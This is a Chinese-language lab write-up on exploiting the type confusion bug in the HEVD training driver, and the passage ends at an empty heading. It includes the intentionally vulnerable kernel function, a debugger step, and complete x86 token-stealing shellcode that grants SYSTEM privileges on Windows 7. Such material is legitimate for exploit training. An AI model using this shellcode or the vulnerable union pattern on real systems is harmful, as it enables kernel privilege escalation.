
```c
NTSTATUS TriggerTypeConfusion(
_In_ PUSER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject
)
{
NTSTATUS Status = STATUS_UNSUCCESSFUL;
PKERNEL_TYPE_CONFUSION_OBJECT KernelTypeConfusionObject = NULL;

PAGED_CODE();

__try
{
/ /
// Verify if the buffer resides in user mode
/ /
ProbeForRead(
UserTypeConfusionObject,
sizeof(USER_TYPE_CONFUSION_OBJECT),
(ULONG)__alignof(UCHAR)
);

/ /
// Allocate Pool chunk
/ /
KernelTypeConfusionObject = (PKERNEL_TYPE_CONFUSION_OBJECT)ExAllocatePoolWithTag(
NonPagedPool,
sizeof(KERNEL_TYPE_CONFUSION_OBJECT),
(ULONG)POOL_TAG
);

if (!KernelTypeConfusionObject)
{
/ /
// Unable to allocate Pool chunk
/ /
DbgPrint("[-] Unable to allocate Pool chunk\n");
Status = STATUS_NO_MEMORY;
return Status;
}
else
{
DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
DbgPrint("[+] Pool Size: 0x%X\n", sizeof(KERNEL_TYPE_CONFUSION_OBJECT));
DbgPrint("[+] Pool Chunk: 0x%p\n", KernelTypeConfusionObject);
}
DbgPrint("[+] UserTypeConfusionObject: 0x%p\n", UserTypeConfusionObject);
DbgPrint("[+] KernelTypeConfusionObject: 0x%p\n", KernelTypeConfusionObject);
DbgPrint("[+] KernelTypeConfusionObject Size: 0x%X\n", sizeof(KERNEL_TYPE_CONFUSION_OBJECT));

KernelTypeConfusionObject->ObjectID = UserTypeConfusionObject->ObjectID;
KernelTypeConfusionObject->ObjectType = UserTypeConfusionObject->ObjectType;

DbgPrint("[+] KernelTypeConfusionObject->ObjectID: 0x%p\n", KernelTypeConfusionObject->ObjectID);
DbgPrint("[+] KernelTypeConfusionObject->ObjectType: 0x%p\n", KernelTypeConfusionObject->ObjectType);

#ifdef SECURE
/ /
// Secure Note: This is secure because the developer is properly setting 'Callback'
/ / member of the 'KERNEL_TYPE_CONFUSION_OBJECT' structure before passing the pointer
/ / of 'KernelTypeConfusionObject' to 'TypeConfusionObjectInitializer()' function as
/ / parameter
/ /
KernelTypeConfusionObject->Callback = &TypeConfusionObjectCallback;
Status = TypeConfusionObjectInitializer(KernelTypeConfusionObject);
#else
DbgPrint("[+] Triggering Type Confusion\n");

/ /
// Vulnerability Note: This is a vanilla Type Confusion vulnerability due to improper
/ / use of the 'UNION' construct. The developer has not set the 'Callback' member of
/ / the 'KERNEL_TYPE_CONFUSION_OBJECT' structure before passing the pointer of
/ / 'KernelTypeConfusionObject' to 'TypeConfusionObjectInitializer()' function as
/ / parameter
/ /
Status = TypeConfusionObjectInitializer(KernelTypeConfusionObject);
//漏洞点
#endif

DbgPrint("[+] Freeing KernelTypeConfusionObject Object\n");
DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
DbgPrint("[+] Pool Chunk: 0x%p\n", KernelTypeConfusionObject);

/ /
// Free the allocated Pool chunk
/ /
ExFreePoolWithTag((PVOID)KernelTypeConfusionObject, (ULONG)POOL_TAG);
KernelTypeConfusionObject = NULL;
}
__except (EXCEPTION_EXECUTE_HANDLER)
{
Status = GetExceptionCode();
DbgPrint("[-] Exception Code: 0x%X\n", Status);
}

return Status;
}
```

```c
typedef struct _KERNEL_TYPE_CONFUSION_OBJECT
{
ULONG_PTR ObjectID;
union
{
ULONG_PTR ObjectType;//控制该对象即可 控制为payload地址
FunctionPointer Callback;
};
} KERNEL_TYPE_CONFUSION_OBJECT, *PKERNEL_TYPE_CONFUSION_OBJECT;
```

# 0x02漏洞分析

我们对以下函数下断点

```
bp HEVD!TriggerTypeConfusion
```

运行到图中处 然后查看`KernelTypeConfusionObject`结构体的内容 其中第二项即为`ObjectType`的地址 也就是我们shellcode的地址

![](https://bbs.kanxue.com/upload/attach/202010/858876_Y8T4Q4PAA8GFTQK.png)

# 0x03漏洞利用

对于类型混淆的话需要进一步了解的 [看这里](https://bbs.kanxue.com/elink@dffK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2X3M7X3g2W2j5Y4g2X3i4K6u0W2j5$3!0E0i4K6u0r3N6Y4g2D9M7#2)9J5c8U0p5&6y4U0t1%4y4W2)9J5k6h3S2@1L8h3H3`.

这次用的官方的exp 这里顺带说一下 我用本机的vs2019编译的 在编译前更改了这些 好像也不用改 但我还是改了qaq

![](https://bbs.kanxue.com/upload/attach/202010/858876_AU3YMER6XAXWDRD.png)

其实这里exp的话 自己写好些 wjllz师傅就是自己写的 我这边环境还是什么问题就无法提权 也没想纠结太长时间

# shellcode

```c
VOID TokenStealingPayloadWin7New() {
 / / Importance of Kernel Recovery
 __asm {
 cmp [ExploitSuccessful], TRUE
 je KernelRecoveryStub

 pushad ; Save registers state

 ; Start of Token Stealing Stub
 xor eax, eax ; Set ZERO
 mov eax, fs:[eax + KTHREAD_OFFSET] ; Get nt!_KPCR.PcrbData.CurrentThread
 ; _KTHREAD is located at FS:[0x124]

 mov eax, [eax + EPROCESS_OFFSET] ; Get nt!_KTHREAD.ApcState.Process
 mov ecx, eax ; Copy current process _EPROCESS structure
 mov edx, SYSTEM_PID ; WIN 7 SP1 SYSTEM process PID = 0x4
 SearchSystemPID:
 mov eax, [eax + FLINK_OFFSET] ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
 sub eax, FLINK_OFFSET
 cmp [eax + PID_OFFSET], edx ; Get nt!_EPROCESS.UniqueProcessId
 jne SearchSystemPID

 mov edx, [eax + TOKEN_OFFSET] ; Get SYSTEM process nt!_EPROCESS.Token
 mov [ecx + TOKEN_OFFSET], edx ; Replace target process nt!_EPROCESS.Token
 ; with SYSTEM process nt!_EPROCESS.Token
 ; End of Token Stealing Stub

 popad ; Restore registers state
 mov [ExploitSuccessful], TRUE ; Set ExploitSuccessful to TRUE
 ; Kernel Recovery Stub
 KernelRecoveryStub:
 xor eax, eax ; Set NTSTATUS SUCCEESS
 add esp, 12 ; Fix the stack
 pop ebp ; Restore saved EBP
 ret 8 ; Return cleanly
 }
}
```

## 调用
